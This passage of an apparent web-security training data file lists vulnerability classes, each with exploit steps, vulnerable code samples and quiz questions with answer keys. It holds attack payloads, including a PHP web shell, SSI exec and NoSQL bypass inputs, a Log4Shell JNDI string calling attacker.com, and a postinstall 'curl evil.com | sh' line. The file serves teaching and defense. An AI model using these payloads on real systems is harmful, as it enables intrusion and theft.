          "It requires admin access to exploit",
          "It only works in older browsers"
        ],
        "answer": 0
      },
      {
        "question": "Which defenses help prevent prototype pollution?",
        "options": [
          "Freezing Object.prototype, using Map instead of plain objects, and filtering dangerous keys like __proto__/constructor during merges",
          "Minifying the JavaScript bundle",
          "Adding more unit tests for the UI",
          "Switching to server-side rendering"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Server-Side Includes (SSI) Injection",
    "category": "Injection",
    "severity": "High",
    "definition": "Inject SSI directives into server-parsed pages, leading to command execution.",
    "theory": "Servers parsing SSI (.shtml) execute directives like <!--#exec--> found in user input.",
    "cve": "CVE-2021-40438 context (Apache)",
    "exploit": "1. Inject <!--#exec cmd=\"id\"--> into a reflected field on an SSI page.\n2. Server executes the command and reflects output.",
    "example": {
      "scenario": "A guestbook page rendered as .shtml echoes back the visitor's name field directly into the page; an attacker submits an SSI exec directive as their 'name' and the server runs it as a shell command.",
      "code": "<!-- Vulnerable guestbook.shtml template -->\nWelcome, <!--#echo var=\"QUERY_STRING_name\" -->!\n\n// Attacker submits as name parameter:\nname=<!--#exec cmd=\"id\"-->\n// When the page is re-rendered, the server executes 'id' and reflects the output"
    },
    "mitigation": "Disable SSI exec, sanitize input, avoid .shtml for user content.",
    "quizzes": [
      {
        "question": "SSI injection executes directives like:",
        "options": ["<!--#exec cmd=...-->", "<script>", "SELECT *", "${jndi}"],
        "answer": 0
      },
      {
        "question": "What server-side condition is required for SSI injection to be exploitable?",
        "options": [
          "The server must parse the page for SSI directives (typically .shtml) and reflect unsanitized user input into it",
          "The site must use cookies",
          "The site must run on Windows",
          "The site must use a CDN"
        ],
        "answer": 0
      },
      {
        "question": "What's a key mitigation for SSI injection?",
        "options": [
          "Disable the SSI #exec directive and avoid serving user-influenced content as SSI-parsed pages",
          "Use a stronger TLS cipher",
          "Add a WAF rule for SQL keywords only",
          "Increase server RAM"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "LDAP Injection",
    "category": "Injection",
    "severity": "High",
    "definition": "Manipulate LDAP queries via unsanitized input to bypass auth or extract data.",
    "theory": "Apps building LDAP filters from input can be tricked with special chars (*, ), |, &) to alter logic.",
    "cve": "CVE-2018-1000134 context",
    "exploit": "1. In a login filter (uid={input}), enter *)(uid=*))(|(uid=*.\n2. Filter always matches -> auth bypass.",
    "example": {
      "scenario": "A corporate intranet login checks credentials against an LDAP directory by directly inserting the submitted username into the search filter, letting an attacker craft a filter that always evaluates true and logs in as anyone.",
      "code": "// Vulnerable LDAP filter construction\nconst filter = `(uid=${username})`; // string concatenation, no escaping\n\n// Attacker input for username field\n*)(uid=*))(|(uid=*\n// Resulting filter becomes effectively: (uid=*) -- matches every entry in the directory"
    },
    "mitigation": "Escape LDAP special chars, parameterized LDAP APIs.",
    "quizzes": [
      {
        "question": "Which character is heavily abused in LDAP injection?",
        "options": ["*", "@", "#", "~"],
        "answer": 0
      },
      {
        "question": "What is the LDAP injection attacker primarily manipulating?",
        "options": [
          "The logic of the LDAP search filter built from unsanitized input",
          "The TLS handshake",
          "The DNS resolution order",
          "The HTTP response headers"
        ],
        "answer": 0
      },
      {
        "question": "What's the recommended fix for LDAP injection?",
        "options": [
          "Properly escape LDAP special characters or use parameterized/safe LDAP query APIs",
          "Disable LDAP entirely",
          "Use a longer password policy",
          "Switch to OAuth"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "NoSQL Injection",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Injection targeting NoSQL databases (MongoDB) via operator manipulation.",
    "theory": "NoSQL queries accept objects; passing operators like {$ne:null} can bypass auth or extract data.",
    "cve": "CVE-2021-22911 (Rocket.Chat)",
    "exploit": "1. Login JSON: {\"user\":\"admin\",\"pass\":{\"$ne\":null}}.\n2. Matches any non-null password -> login as admin.",
    "example": {
      "scenario": "A MongoDB-backed login endpoint passes the JSON body's password field directly into the query; sending a MongoDB operator object instead of a plain string string bypasses authentication entirely.",
      "code": "// Vulnerable login query\nconst user = await db.collection('users').findOne({\n  username: req.body.username,\n  password: req.body.password  // attacker sends an object, not a string\n});\n\n// Attacker request body\n{ \"username\": \"admin\", \"password\": { \"$ne\": null } }\n// Query becomes: password != null -> matches the admin account regardless of the real password"
    },
    "mitigation": "Cast inputs to expected types; reject objects where strings expected.",
    "quizzes": [
      {
        "question": "Which MongoDB operator is abused to bypass login?",
        "options": ["$ne", "$pull", "$inc", "$set"],
        "answer": 0
      },
      {
        "question": "Why does sending a JSON object instead of a string break the login check in NoSQL injection?",
        "options": [
          "NoSQL queries can interpret operator objects (like $ne, $gt) as query logic instead of literal values",
          "The database crashes and grants access by default",
          "It triggers a buffer overflow",
          "It disables TLS"
        ],
        "answer": 0
      },
      {
        "question": "What is an effective defense against NoSQL injection?",
        "options": [
          "Strictly enforce expected data types (reject objects where a string is expected) before querying",
          "Use a longer collection name",
          "Disable indexing",
          "Increase query timeout"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Unrestricted File Upload",
    "category": "Access Control",
    "severity": "Critical",
    "definition": "Upload of dangerous file types (.php) that can be executed, leading to RCE.",
    "theory": "When validation relies on extension or client checks, attackers upload web shells. Bypasses: double extensions, null bytes, content-type spoofing.",
    "cve": "CVE-2020-9484 (Apache Tomcat)",
    "exploit": "1. Upload shell.php.jpg or shell.php%00.jpg.\n2. Access the uploaded path.\n3. Execute commands via the web shell.",
    "example": {
      "scenario": "A profile-picture upload feature only checks the file's declared Content-Type (which the client can freely fake) and stores the file inside the public web root, letting an attacker upload a PHP web shell disguised as an image.",
      "code": "// Vulnerable upload handler — trusts client-supplied content-type, stores in webroot\nif (req.file.mimetype.startsWith('image/')) {\n  fs.writeFileSync(`./public/uploads/${req.file.originalname}`, req.file.buffer);\n}\n\n// Attacker uploads shell.php.jpg with a spoofed Content-Type: image/jpeg header\n// File content: <?php system($_GET['cmd']); ?>\n// Then accesses: GET /uploads/shell.php.jpg?cmd=id  (server still parses .php extension)"
    },
    "mitigation": "Server-side type validation, store outside webroot, rename, disable execution.",
    "quizzes": [
      {
        "question": "A safe practice for uploads is to store files where?",
        "options": ["Inside the web root", "Outside the web root / non-executable dir", "In /etc", "In cookies"],
        "answer": 1
      },
      {
        "question": "Why is client-supplied Content-Type alone insufficient to validate an upload?",
        "options": [
          "The attacker fully controls that header and can set it to anything regardless of actual file content",
          "Content-Type is encrypted",
          "Browsers strip Content-Type automatically",
          "Servers ignore Content-Type entirely"
        ],
        "answer": 0
      },
      {
        "question": "Which bypass technique tricks naive extension-based filters into accepting an executable file?",
        "options": [
          "Double extensions or null-byte tricks like shell.php.jpg or shell.php%00.jpg",
          "Using a longer filename",
          "Uploading via FTP instead of HTTP",
          "Compressing the file first"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Host Header Injection",
    "category": "Server-Side",
    "severity": "Medium",
    "definition": "Manipulate the Host header to poison links, reset passwords, or cache.",
    "theory": "Apps trusting Host to build URLs (password resets) can generate links to attacker domains, leaking tokens.",
    "cve": "CVE-2018-14773 context (Symfony)",
    "exploit": "1. Request password reset with Host: evil.com.\n2. Reset link points to evil.com with victim's token.\n3. Victim clicks -> token leaked.",
    "example": {
      "scenario": "A password-reset email builder trusts the incoming Host header to construct the reset link; an attacker requests a reset for the victim's email while sending a forged Host header, so the victim receives a real reset email pointing to the attacker's domain — leaking the reset token the moment they click it.",
      "code": "// Vulnerable link-building code\nconst resetLink = `http://${req.headers.host}/reset?token=${token}`;\n// emailed to the victim as: Click here to reset your password: <resetLink>\n\n// Attacker's forged request\nPOST /forgot-password HTTP/1.1\nHost: evil.com\nContent-Type: application/json\n\n{\"email\":\"victim@company.com\"}\n// Victim receives a legitimate-looking email, but the link points to evil.com/reset?token=..."
    },
    "mitigation": "Allowlist valid hosts; don't build absolute URLs from Host.",
    "quizzes": [
      {
        "question": "Host header injection is often chained with which feature?",
        "options": ["Password reset links", "CSS rendering", "Image resizing", "Logging"],
        "answer": 0
      },
      {
        "question": "Why is trusting the Host header risky?",
        "options": [
          "The Host header is fully attacker-controlled in the raw HTTP request and not guaranteed to match the real domain",
          "The Host header is encrypted by default",
          "The Host header is validated by browsers automatically",
          "The Host header only exists in HTTP/2"
        ],
        "answer": 0
      },
      {
        "question": "What's the correct fix for Host header injection?",
        "options": [
          "Use a server-side allowlist of valid hostnames instead of building absolute URLs from the incoming Host header",
          "Encrypt the Host header",
          "Increase the token length",
          "Use a CDN"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Cache Poisoning",
    "category": "Infrastructure",
    "severity": "High",
    "definition": "Inject malicious content into a cache so it's served to other users.",
    "theory": "Unkeyed inputs (headers) that influence responses but aren't part of the cache key let an attacker poison cached responses.",
    "cve": "Various CDN cases",
    "exploit": "1. Find unkeyed header (X-Forwarded-Host) reflected in response.\n2. Send poisoned request; CDN caches it.\n3. Other users receive malicious cached page.",
    "example": {
      "scenario": "A site reflects the X-Forwarded-Host header into a canonical link tag, but the CDN's cache key only includes the URL path, not that header — so an attacker's single poisoned request gets cached and served to every subsequent visitor of that page.",
      "code": "<!-- Vulnerable page reflects an unkeyed header -->\n<link rel=\"canonical\" href=\"https://<X-Forwarded-Host value>/page\">\n\n// Attacker request (cache key = just /page, header is NOT part of the key)\nGET /page HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: evil.com\n\n// CDN caches this poisoned response under /page\n// Every other visitor to /page now gets the canonical link pointing to evil.com"
    },
    "mitigation": "Include all influencing inputs in cache key; sanitize reflected headers.",
    "quizzes": [
      {
        "question": "Cache poisoning exploits which type of input?",
        "options": ["Unkeyed inputs", "Encrypted inputs", "Compressed inputs", "Signed inputs"],
        "answer": 0
      },
      {
        "question": "Why is an 'unkeyed' input dangerous for caching?",
        "options": [
          "It can influence the response content without being part of the cache key, so a malicious version gets cached and served to other users",
          "It bypasses TLS",
          "It always returns a 500 error",
          "It only affects the attacker's own browser"
        ],
        "answer": 0
      },
      {
        "question": "What's an effective mitigation for web cache poisoning?",
        "options": [
          "Ensure every input that influences the response is included in the cache key, or strip/sanitize unkeyed inputs before they affect output",
          "Disable caching site-wide permanently",
          "Use a shorter cache TTL only",
          "Add a CAPTCHA"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "OAuth Misconfiguration",
    "category": "Auth & Session",
    "severity": "Critical",
    "definition": "Flaws in OAuth flows such as weak redirect_uri validation enabling token theft.",
    "theory": "Loose redirect_uri matching, missing state (CSRF), or leaking codes allow account takeover via the OAuth flow.",
    "cve": "CVE-2020-26877 context",
    "exploit": "1. Manipulate redirect_uri to attacker domain (if not strict).\n2. Victim's code/token delivered to attacker.\n3. Exchange for access -> account takeover.",
    "example": {
      "scenario": "A 'Login with Google' integration validates redirect_uri with a loose prefix match instead of an exact match, letting an attacker register a lookalike redirect URL that captures the victim's authorization code and takes over their account.",
      "code": "// Vulnerable redirect_uri validation (substring/prefix match instead of exact)\nif (redirect_uri.startsWith('https://app.com')) { /* allowed */ }\n\n// Attacker-crafted authorization request\nhttps://oauth-provider.com/authorize?\n  client_id=app123&\n  redirect_uri=https://app.com.evil.com/callback&  // passes the loose 'startsWith' check\n  response_type=code&state=xyz\n// Victim's authorization code gets delivered to the attacker's domain"
    },
    "mitigation": "Exact-match redirect_uri, enforce state, short-lived codes, PKCE.",
    "quizzes": [
      {
        "question": "Which parameter prevents CSRF in OAuth flows?",
        "options": ["scope", "state", "client_id", "grant_type"],
        "answer": 1
      },
      {
        "question": "Why is exact-match validation of redirect_uri critical?",
        "options": [
          "Loose matching (prefix/substring) lets an attacker register a similar-looking domain that still passes validation, stealing the auth code/token",
          "Exact match makes the login page load faster",
          "It prevents password reuse",
          "It encrypts the access token"
        ],
        "answer": 0
      },
      {
        "question": "What does PKCE (Proof Key for Code Exchange) protect against in OAuth?",
        "options": [
          "Authorization code interception/replay by a party that doesn't possess the original code verifier",
          "SQL injection",
          "DNS spoofing",
          "Buffer overflows"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "GraphQL Vulnerabilities",
    "category": "API Security",
    "severity": "Medium",
    "definition": "Introspection abuse, batching attacks, excessive data exposure in GraphQL APIs.",
    "theory": "GraphQL flexibility leaks schema via introspection, allows DoS via nested queries, brute-force via batching/aliasing.",
    "cve": "CVE-2021-41248 context",
    "exploit": "1. Run introspection query to map the schema.\n2. Use aliases to batch many login attempts in one request.\n3. Nested queries for resource exhaustion (DoS).",
    "example": {
      "scenario": "A GraphQL API leaves introspection enabled in production, letting an attacker map every field and mutation in the schema, then uses query aliasing to bundle hundreds of login-guess attempts into a single HTTP request — bypassing simple per-request rate limits.",
      "code": "# Step 1: introspection reveals the full schema\nquery { __schema { types { name fields { name } } } }\n\n# Step 2: aliased batch login-brute-force in ONE request\nquery {\n  a1: login(user:\"admin\", pass:\"123456\") { token }\n  a2: login(user:\"admin\", pass:\"password\") { token }\n  a3: login(user:\"admin\", pass:\"admin123\") { token }\n  # ...hundreds more aliases in the same request\n}"
    },
    "mitigation": "Disable introspection in prod, depth/complexity limits, rate-limit.",
    "quizzes": [
      {
        "question": "Which GraphQL feature leaks the entire API schema?",
        "options": ["Mutations", "Introspection", "Subscriptions", "Fragments"],
        "answer": 1
      },
      {
        "question": "How does GraphQL aliasing enable brute-force attacks that bypass naive rate limiting?",
        "options": [
          "Many distinct operations (e.g. login attempts) can be bundled into a single HTTP request using aliases, counting as just one request to a per-request limiter",
          "Aliasing encrypts the payload",
          "Aliasing disables authentication",
          "Aliasing only works over GET requests"
        ],
        "answer": 0
      },
      {
        "question": "What's a recommended hardening step for production GraphQL APIs?",
        "options": [
          "Disable introspection, and enforce query depth/complexity limits plus rate limiting on operation count, not just requests",
          "Allow unlimited nested queries for flexibility",
          "Expose the schema publicly for documentation purposes",
          "Use GET requests only"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Web Cache Deception",
    "category": "Infrastructure",
    "severity": "Medium",
    "definition": "Trick a cache into storing sensitive personalized pages later read by attackers.",
    "theory": "Appending a fake static extension (/account/page.css) makes the cache store a victim's authenticated page as static.",
    "cve": "PayPal research (2017)",
    "exploit": "1. Lure victim to /profile/foo.css.\n2. Cache stores their personal response as static.\n3. Attacker requests same URL and reads data.",
    "example": {
      "scenario": "An attacker tricks a logged-in victim into visiting /account/profile/nonexistent.css — the app ignores the fake extension and serves the victim's real personal profile page, but the CDN sees '.css' and caches it as static content the attacker can then request and read.",
      "code": "// Attacker sends victim a link (e.g. via chat/email)\nhttps://victim-app.com/account/profile/anything.css\n\n// App backend ignores the path suffix and returns the victim's authenticated profile HTML\n// CDN sees the .css extension and caches the response as if it were a static stylesheet\n\n// Attacker later requests the exact same URL and receives the victim's cached personal data\nGET /account/profile/anything.css"
    },
    "mitigation": "Cache only verified static content; validate Content-Type.",
    "quizzes": [
      {
        "question": "Web cache deception abuses fake what?",
        "options": ["Static file extensions", "TCP ports", "DNS records", "JWT claims"],
        "answer": 0
      },
      {
        "question": "What's the core mismatch that enables web cache deception?",
        "options": [
          "The application ignores the fake static extension and serves dynamic personal content, but the cache treats the URL as cacheable static content",
          "The browser caches passwords",
          "The server forgets to set cookies",
          "The CDN doesn't support HTTPS"
        ],
        "answer": 0
      },
      {
        "question": "How should caches defend against web cache deception?",
        "options": [
          "Validate the actual Content-Type of the response (not just the URL extension) before caching, and never cache authenticated/personalized pages",
          "Cache everything by default for performance",
          "Increase cache TTL",
          "Use a longer URL"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Broken Object Level Authorization (BOLA)",
    "category": "API Security",
    "severity": "Critical",
    "definition": "API endpoints expose objects by ID without checking ownership.",
    "theory": "OWASP API #1. Endpoints like /api/orders/{id} that don't verify ownership allow horizontal data access.",
    "cve": "CVE-2021-22214 context (GitLab API)",
    "exploit": "1. Request /api/v1/users/1001/invoice.\n2. Increment to 1002, 1003...\n3. Access other users' invoices.",
    "example": {
      "scenario": "An invoicing API returns any invoice by numeric ID without checking whether the requesting user actually owns it, letting a logged-in customer simply increment the ID in the URL to read every other customer's invoices.",
      "code": "// Vulnerable endpoint — fetches by ID with no ownership check\napp.get('/api/v1/users/:userId/invoice', requireAuth, async (req, res) => {\n  const invoice = await db.query('SELECT * FROM invoices WHERE user_id=$1', [req.params.userId]);\n  res.json(invoice); // never checks req.user.id === req.params.userId\n});\n\n// Attacker simply changes the ID in the URL\nGET /api/v1/users/1002/invoice  (while authenticated as user 1001)"
    },
    "mitigation": "Per-object authorization checks on every request; unguessable IDs.",
    "quizzes": [
      {
        "question": "BOLA is ranked #1 in which list?",
        "options": ["OWASP API Top 10", "CWE Top 5", "NIST 800-53", "PCI DSS"],
        "answer": 0
      },
      {
        "question": "What's the precise flaw in BOLA, as opposed to just having predictable IDs?",
        "options": [
          "The server fails to verify that the authenticated user actually owns/is authorized to access the requested object",
          "The IDs are encrypted",
          "The API uses HTTP instead of HTTPS",
          "The session token is too short"
        ],
        "answer": 0
      },
      {
        "question": "What is the correct defense against BOLA?",
        "options": [
          "Enforce an object-level ownership/authorization check on every request that accesses an object by ID",
          "Make IDs longer strings",
          "Rate-limit the endpoint",
          "Add pagination"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Dependency Confusion",
    "category": "Supply Chain",
    "severity": "Critical",
    "definition": "Supply-chain attack where a public malicious package shadows a private internal package name.",
    "theory": "If a build pulls from public registries and a private name isn't claimed, an attacker publishes a higher-version public package that gets installed.",
    "cve": "Disclosed by Alex Birsan (2021)",
    "exploit": "1. Discover internal package names (leaked package.json).\n2. Publish same-named package on npm/PyPI with higher version.\n3. Victim's build installs yours -> code execution in CI.",
    "example": {
      "scenario": "A company's internal-only npm package 'acme-internal-auth' leaks in a public package.json on GitHub; an attacker publishes a public npm package with the exact same name and a higher version number, which the company's CI build then installs instead of the real internal package — running attacker code inside the build pipeline.",
      "code": "// Leaked internal package.json reveals a private dependency name\n\"dependencies\": { \"acme-internal-auth\": \"1.2.0\" }\n\n// Attacker publishes a public npm package with the same name, higher version\n// npm publish acme-internal-auth@9.9.9  (malicious postinstall script included)\n\n// CI pipeline, configured to check public npm first, installs the attacker's package\n// package.json \"postinstall\": \"curl https://evil.com/x.sh | sh\""
    },
    "mitigation": "Scoped packages, registry priorities, lock versions, claim namespaces.",
    "quizzes": [
      {
        "question": "Dependency confusion is a type of what attack?",
        "options": ["Supply chain attack", "DoS", "MITM", "Phishing"],
        "answer": 0
      },
      {
        "question": "Why does the attacker publish a higher version number for the malicious package?",
        "options": [
          "Most package managers default to installing the highest available version across configured registries",
          "Higher version numbers bypass code review",
          "It makes the package load faster",
          "It avoids antivirus detection"
        ],
        "answer": 0
      },
      {
        "question": "What's a recommended defense against dependency confusion?",
        "options": [
          "Use scoped package names, explicit registry priorities/pinning, and claim internal package names on public registries",
          "Disable package-lock files",
          "Always install the latest version automatically",
          "Remove package.json from version control"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Log4Shell / EL Injection",
    "category": "Injection",
    "severity": "Critical",
    "definition": "Injection into logging/EL frameworks (Log4j JNDI) enabling remote code execution.",
    "theory": "Log4j evaluated ${jndi:ldap://...} lookups in logged strings, fetching/executing remote classes. EL injection abuses Expression Language similarly.",
    "cve": "CVE-2021-44228 (Log4Shell)",
    "exploit": "1. Send a header/field with ${jndi:ldap://attacker.com/a}.\n2. Vulnerable Log4j logs it and connects to attacker LDAP.\n3. Malicious class loaded -> RCE.",
    "example": {
      "scenario": "A Java web server logs every incoming User-Agent header using a vulnerable Log4j version; an attacker sets their User-Agent to a JNDI lookup string, causing the server to silently connect to an attacker-controlled LDAP server and load a malicious Java class — full remote code execution from a single HTTP header.",
      "code": "// Vulnerable logging call\nlogger.info(\"Request from User-Agent: \" + request.getHeader(\"User-Agent\"));\n\n// Attacker-controlled header\nUser-Agent: ${jndi:ldap://attacker.com:1389/Exploit}\n\n// Log4j evaluates the lookup while logging, connects to attacker's LDAP server,\n// downloads and deserializes a malicious Java class -> arbitrary code execution"
    },
    "mitigation": "Patch Log4j (>=2.17), disable JNDI lookups, WAF, remove JndiLookup.",
    "quizzes": [
      {
        "question": "Which payload indicates a Log4Shell attempt?",
        "options": ["${jndi:ldap://...}", "' OR 1=1", "<img onerror>", "../../"],
        "answer": 0
      },
      {
        "question": "Why was Log4Shell so widely impactful?",
        "options": [
          "Log4j is used in countless Java applications and the flaw could be triggered just by logging an attacker-controlled string, often via common headers",
          "It only affected one specific website",
          "It required physical server access",
          "It only worked on outdated browsers"
        ],
        "answer": 0
      },
      {
        "question": "What's the primary remediation for Log4Shell?",
        "options": [
          "Upgrade Log4j to a patched version (>=2.17) and/or disable JNDI lookups",
          "Block all logging entirely",
          "Switch programming languages",
          "Add a CAPTCHA to all forms"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Memory Corruption: Buffer Overflow",
    "category": "Memory Safety",
    "severity": "Critical",
    "definition": "Writing beyond a buffer's bounds, overwriting adjacent memory and potentially hijacking execution.",
    "theory": "In unsafe languages (C/C++), unchecked input copied into a fixed buffer overwrites the return address. Attackers redirect execution to shellcode or ROP chains.",
    "cve": "CVE-2019-0708 (BlueKeep)",
    "exploit": "1. Identify vulnerable input (strcpy, no bounds).\n2. Send oversized input to overwrite EIP/RIP.\n3. Control flow -> jump to shellcode (ROP to bypass DEP/ASLR).",
    "example": {
      "scenario": "A C network service copies an incoming username field into a fixed 64-byte stack buffer using strcpy with no length check; sending a username far longer than 64 bytes overflows the buffer and overwrites the function's return address, letting the attacker redirect execution to their own shellcode.",
      "code": "// Vulnerable C code\nvoid handle_login(char *input) {\n    char username[64];\n    strcpy(username, input); // no bounds check — classic overflow\n}\n\n// Attacker sends a 200-byte username:\n// [64 bytes of filler][8 bytes overwriting saved RBP][8 bytes overwriting return address -> shellcode address]\nhandle_login(\"AAAAAAAA...[200 bytes total, crafted to redirect RIP]\");"
    },
    "mitigation": "Safe functions, bounds checking, stack canaries, ASLR, DEP, memory-safe languages.",
    "quizzes": [
      {
        "question": "Buffer overflows typically aim to overwrite which value?",
        "options": ["The return address (EIP/RIP)", "The cookie", "The DNS cache", "The CSS"],
        "answer": 0
      },
      {
        "question": "Which C function is a classic source of buffer overflow bugs because it performs no bounds checking?",
        "options": ["strcpy", "snprintf", "strlcpy", "memset"],
        "answer": 0
      },
      {
        "question": "Which combination of modern mitigations makes classic stack buffer overflow exploitation much harder?",
        "options": [
          "Stack canaries, ASLR, and DEP/NX together",
          "Longer variable names",
          "Faster CPUs",
          "More RAM"
        ],
        "answer": 0
      },
      {
        "question": "What is the most fundamental long-term fix for buffer overflow vulnerabilities?",
        "options": [
          "Using memory-safe languages or bounds-checked operations instead of unchecked fixed-size buffer copies",
          "Increasing buffer size arbitrarily",
          "Disabling logging",
          "Using shorter passwords"
        ],
        "answer": 0
      }
    ]
  }
];
